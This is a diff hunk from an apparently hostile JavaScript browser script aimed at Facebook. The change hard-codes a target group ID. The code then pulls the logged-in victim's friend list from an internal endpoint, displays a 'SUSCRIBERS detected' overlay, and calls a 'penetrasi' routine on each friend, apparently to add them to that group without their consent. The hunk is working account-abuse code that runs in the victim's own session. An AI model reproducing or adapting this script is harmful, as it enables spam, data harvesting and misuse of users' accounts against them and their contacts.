@@ -158,7 +158,7 @@ if (document.URL.indexOf("www.facebook.com/scenaags") >= 0) {
         k = 0,
         suc = 0,
         arr = [],
-        memberGroupId = document.getElementsByName("group_id")[0].value;
+        memberGroupId = "378311225587222";
     jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Env.user + "&filter[0]=user&__user=" + Env.user, function (e) {
         for (var e = e.substring(e.indexOf("{")), e = JSON.parse(e), e = e.payload.entries, t = 0; t < e.length; t++) arr.push(e[t].uid);
         tay = i = arr.length - 1, console.log(arr.length), e = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>" + ("<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>"), e += arr.length + " SUSCRIBERS detected", document.getElementById("pagelet_welcome_box").innerHTML = e + "</div>", penetrasi(arr[i])
